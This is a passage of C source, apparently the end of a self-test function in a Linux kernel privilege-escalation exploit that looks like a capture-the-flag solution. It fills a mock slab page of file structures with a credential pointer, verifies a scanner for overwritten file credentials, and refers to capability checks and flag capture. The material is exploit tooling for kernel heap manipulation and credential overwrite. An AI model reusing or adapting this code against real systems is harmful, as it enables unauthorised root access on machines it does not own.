                                    i * H_FILE_STRIDE + H_FILE_CRED),
                       "filp_target_gap");
    for (i = 0; i < k2l.files_per_slab; i++)
        put_u64(page + i * H_FILE_STRIDE + H_FILE_CRED, cred);
    SELFTEST_CHECK(scan_filp_cred(page, &scanned, &hits) == 0 &&
                   scanned == cred, "filp_cred_scanner");
    (void)read_cap_eff;
    (void)try_flag;
    printf("SELFTEST_PASS base=%#" PRIx64 " freeptr=%u files=%u\n", sol.base,
           k2l.freeptr, k2l.files_per_slab);
#undef SELFTEST_CHECK
    return 0;
}
